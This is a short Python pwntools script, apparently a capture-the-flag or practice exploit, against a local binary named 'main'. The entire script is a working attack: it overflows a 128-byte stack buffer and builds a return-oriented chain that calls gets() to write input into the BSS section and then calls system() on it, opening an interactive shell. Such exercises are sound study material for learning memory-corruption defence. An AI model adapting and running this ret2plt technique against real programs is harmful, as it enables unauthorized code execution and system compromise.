
from pwn import *

GETS_PLT = 0x08048350
SYSTEM_PLT = 0x08048370

BSS = 0x0804a028

POP_RET = 0x080485cb


s = process("./main")

# Uncomment for debugging
#gdb.attach(s, '''
#	b*0x080484e5
#	''')

payload = 'A'*128
payload += 'BBBB' # EBP

# ROP
# First call
payload += p32(GETS_PLT) # GETS
payload += p32(POP_RET) # RET ADDRESS GETS (GADGET)
payload += p32(BSS) # 1 PARAM FOR GETS

# Second call
payload += p32(SYSTEM_PLT) # SYSTEM
payload += 'AAAA' # RET ADDRESS SYSTEM
payload += p32(BSS) # 1 PARAM FOR SYSTEM


payload += '\n'
s.send(payload)
print(s.recv())
s.interactive()
s.close()